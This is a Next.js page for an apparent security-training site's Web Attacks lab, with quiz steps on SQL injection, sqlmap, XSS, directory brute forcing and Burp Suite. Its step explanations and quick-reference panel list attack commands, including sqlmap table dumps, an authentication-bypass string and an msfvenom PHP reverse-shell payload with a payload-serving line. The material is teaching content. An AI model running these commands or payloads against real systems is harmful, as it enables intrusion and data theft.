'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#00d4ff'
const moduleId = 'web-attacks'
const moduleName = 'Web Attacks'
const moduleNum = '06'
const xpTotal = 120

const steps: LabStep[] = [
  {
    id: 'web-01',
    title: 'SQL Injection Detection',
    objective: 'Test a login form for SQL injection by breaking out of the SQL string context. What single character is the classic first test for SQLi?',
    hint: 'It\'s the SQL string delimiter — the character that closes a string literal.',
    answers: ["'", "' --", "single quote", "apostrophe"],
    xp: 15,
    explanation: 'A single quote breaks out of the SQL string context. If the app returns an error like "syntax error near \'\'" it\'s almost certainly vulnerable. The next step is: \' OR \'1\'=\'1 to bypass authentication or use sqlmap for automated exploitation.'
  },
  {
    id: 'web-02',
    title: 'SQLMap Automation',
    objective: 'Automate SQL injection exploitation with sqlmap. What flag extracts all database names from a vulnerable URL?',
    hint: 'The flag is --dbs (databases). Basic usage: sqlmap -u "url" --dbs',
    answers: ['--dbs', 'sqlmap --dbs', '-u url --dbs'],
    xp: 25,
    explanation: 'sqlmap -u "http://target/page?id=1" --dbs enumerates all databases. Then --tables -D dbname lists tables. --dump -D dbname -T tablename extracts data. Add --level=5 --risk=3 for more aggressive detection of complex injections.'
  },
  {
    id: 'web-03',
    title: 'XSS Payload',
    objective: 'Test for reflected XSS. What is the simplest JavaScript alert payload to test if a site is vulnerable?',
    hint: 'It opens a JavaScript alert dialog. Classic CTF/pentest test.',
    answers: ['<script>alert(1)</script>', 'alert(1)', '<script>alert("xss")</script>'],
    flag: 'FLAG{xss_confirmed}',
    xp: 25,
    explanation: 'If the script alert payload executes in the browser, the site reflects unsanitized input into the HTML. Real impact: steal session cookies (document.cookie), redirect to phishing pages, or load malicious scripts via src attribute.'
  },
  {
    id: 'web-04',
    title: 'Directory Brute Force',
    objective: 'Discover hidden directories and files on a web server. What tool performs directory and file brute forcing?',
    hint: 'Popular tools: gobuster, feroxbuster, dirb, dirbuster. Any of these are valid.',
    answers: ['gobuster', 'feroxbuster', 'dirb', 'dirbuster', 'ffuf', 'wfuzz'],
    xp: 20,
    explanation: 'gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,html,txt finds hidden paths. Common discoveries: /admin, /backup, /config, /.git, /api/v1. Add -b 404 to filter false positives.'
  },
  {
    id: 'web-05',
    title: 'Burp Suite Intercept',
    objective: 'Burp Suite is the essential web app testing proxy. What keyboard shortcut in Burp forwards an intercepted request?',
    hint: 'Check the Intercept tab — there\'s a "Forward" button. The shortcut is Ctrl+F.',
    answers: ['ctrl+f', 'ctrl f', 'forward', 'ctrl+f or forward button'],
    flag: 'FLAG{burp_configured}',
    xp: 35,
    explanation: 'Ctrl+F forwards the intercepted request in Burp Suite. Workflow: enable intercept > modify request (change parameters, headers, cookies) > Ctrl+F to send. Right-click > Send to Repeater (Ctrl+R) to replay modified requests without re-intercepting.'
  }
]

export default function WebAttacksLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  useEffect(() => {
    const saved = localStorage.getItem('lab_web-attacks-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#006a7a' }}>
        <Link href="/" style={{ color: '#006a7a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/web-attacks" style={{ color: '#006a7a', textDecoration: 'none' }}>WEB ATTACKS</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/web-attacks" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #003a4a', borderRadius: '3px', color: '#006a7a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(0,212,255,0.1)', border: '1px solid rgba(0,212,255,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(0,212,255,0.04)', border: '1px solid rgba(0,212,255,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#003a4a', border: p.active ? '2px solid ' + accent : '1px solid #003a4a', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#005a6a', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#003a4a', margin: '0 2px' }}>—</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#4a8a9a' }}>
          MOD-{moduleNum} &nbsp;·&nbsp; {moduleName.toUpperCase()} &nbsp;·&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE — LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(0,212,255,0.1)', border: '1px solid rgba(0,212,255,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#005a6a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 — GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Web Attacks Lab</h1>
          </div>
        </div>

        <p style={{ color: '#5a8a9a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          SQL injection, XSS exploitation, directory brute forcing, and Burp Suite workflow.
          Type real commands, earn XP, and capture flags. Complete all 5 steps to unlock Phase 2.
        </p>

        <div style={{ background: 'rgba(0,212,255,0.03)', border: '1px solid rgba(0,212,255,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#003a4a', letterSpacing: '0.25em', marginBottom: '8px' }}>KEY CONCEPTS COVERED IN THIS LAB</div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
            {['SQL injection', 'SQLMap automation', 'XSS reflected/stored', 'Directory brute force', 'Burp Suite proxy', 'IDOR vulnerabilities', 'CSRF attacks', 'XXE injection'].map(c => (
              <span key={c} style={{ fontSize: '7.5px', color: '#3a7a8a', background: 'rgba(0,212,255,0.06)', border: '1px solid rgba(0,212,255,0.12)', padding: '2px 8px', borderRadius: '3px' }}>{c}</span>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="web-attacks-lab"
          moduleId={moduleId}
          title="Web Attacks Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(0,212,255,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(0,212,255,0.4)' : '#003a4a'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#005a6a', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#4a8a9a' : '#005a6a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 — FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#005a6a' }}>Full Web Attacks Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#ffb347', background: 'rgba(255,179,71,0.08)', border: '1px solid rgba(255,179,71,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(0,212,255,0.04)' : '#020608', border: '1px solid ' + (guidedDone ? 'rgba(0,212,255,0.25)' : '#001a2a'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#3a7a8a' : '#003a4a', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#005a6a', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#4a8a9a', marginBottom: '0.75rem', lineHeight: 1.7 }}>
              Free-form terminal sandbox for Web Attacks
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#3a7a8a', marginBottom: '2rem', lineHeight: 1.7 }}>
              Command history &nbsp;·&nbsp; Tab autocomplete &nbsp;·&nbsp; Real command simulation &nbsp;·&nbsp; No restrictions
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['sqlmap exploitation', 'gobuster scanning', 'XSS payload crafting', 'Burp Suite workflow', 'SSRF testing', 'LFI/RFI attacks'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#003a4a' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#4a8a9a' : '#003a4a' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(0,212,255,0.6)' : '#003a4a'), borderRadius: '6px', background: guidedDone ? 'rgba(0,212,255,0.12)' : 'transparent', color: guidedDone ? accent : '#003a4a', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(0,212,255,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#003a4a' }}>Complete all 5 guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#020608' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#020a0e', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#3a7a8a' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any web attack technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #003a4a', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#3a7a8a', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '▼' : '▶'} QUICK REFERENCE — WEB ATTACK COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#020608', border: '1px solid #001a2a', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '8px' }}>
              {[
                ['sqlmap -u "http://target/?id=1" --dbs', 'SQLi enumeration of databases'],
                ['sqlmap -u "url" --dump -D db -T users', 'Dump users table via SQLi'],
                ['gobuster dir -u http://target -w common.txt', 'Directory brute force'],
                ['ffuf -u http://target/FUZZ -w wordlist.txt', 'Fast fuzzing with ffuf'],
                ['nikto -h http://target', 'Web vulnerability scanner'],
                ['wpscan --url http://target --enumerate p', 'WordPress plugin enumeration'],
                ['curl -X POST -d "param=value" http://target/api', 'POST request with curl'],
                ['curl -H "Cookie: session=X" http://target/admin', 'Authenticated curl request'],
                ['python3 -m http.server 8080', 'Serve files for payload delivery'],
                ['msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw > shell.php', 'PHP web shell payload'],
                ['tplmap -u "http://target/?name=test"', 'Server-side template injection'],
                ['ssrfmap -r request.txt', 'SSRF exploitation tool'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#010408', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.72rem', flexShrink: 0 }}>{cmd}</code>
                  <span style={{ color: '#4a8a9a', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #001a2a', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/web-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a7a8a' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/malware/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a7a8a' }}>MOD-07 MALWARE LAB &#8594;</Link>
      </div>
    </div>
  )
}
